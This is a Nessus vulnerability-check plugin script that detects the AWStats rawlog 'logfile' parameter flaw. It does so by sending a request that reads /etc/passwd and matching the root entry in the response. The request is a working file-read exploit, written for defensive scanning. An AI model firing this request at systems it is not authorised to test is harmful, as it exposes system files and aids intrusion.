#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
 script_id(14347);
 script_version("$Revision: 1.19 $");
 script_cvs_date("$Date: 2012/11/16 02:06:29 $");

 script_bugtraq_id(10950);
 script_osvdb_id(9109);

 script_name(english:"AWStats rawlog.pm logfile Parameter Arbitrary Command Execution");
 script_summary(english:"Determines the presence of AWstats awstats.pl");

 script_set_attribute(attribute:"synopsis", value:
"The remote host is running a logfile analyzer that is affected by an
input validation vulnerability.");
 script_set_attribute(attribute:"description", value:
"The remote host is running AWStats, a free real-time logfile analyzer. 

The AWStats Rawlog Plugin which is installed is prone to an input
validation vulnerability.  The issue exists in the 'logfile' URI data
passwed to the 'awstats.pl' script.  An attacker may exploit this to
execute commands remotely or read files subject to the privileges of the
affected web server.");
 script_set_attribute(attribute:"solution", value:"Upgrade to the AWStats 6.4 or later.");
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");

 script_set_attribute(attribute:"vuln_publication_date", value:"2004/08/19");
 script_set_attribute(attribute:"plugin_publication_date", value:"2004/08/23");

 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_set_attribute(attribute:"cpe", value:"cpe:/a:laurent_destailleur:awstats");
 script_end_attributes();
 
 script_category(ACT_GATHER_INFO);
 
 script_copyright(english:"This script is Copyright (C) 2004-2012 Tenable Network Security, Inc.");
 script_family(english:"CGI abuses");
 
 script_dependencies("awstats_detect.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_require_keys("www/AWStats");
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);
if ( ! port ) exit(0);
if (! get_port_state(port)) exit(0, "Port "+port+" is closed");
if (get_kb_item("Services/www/"+port+"/embedded"))
 exit(0, "The web server on port "+port+" is embedded");

function check(url)
{
	local_var req, res;
	req = http_get(port:port, item:url + "/awstats.pl?filterrawlog=&rawlog_maxlines=5000&config=" + get_host_name() + "&framename=main&pluginmode=rawlog&logfile=/etc/passwd");
 	res = http_keepalive_send_recv(port:port, data:req);
 	if ( res == NULL ) 
		exit(1, "The web server on port "+port+" failed to respond");
	if ( egrep(pattern:"root:.*:0:[01]:.*", string:res) )
	{
	 	security_hole(port);
	 	exit(0);
	}
}

# Test an install.
install = get_kb_item(string("www/", port, "/AWStats"));
if (isnull(install)) exit(0, "AWStats was not detected on port "+port);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");

if (!isnull(matches))
{
  dir = matches[2];
  check(url:dir);
}
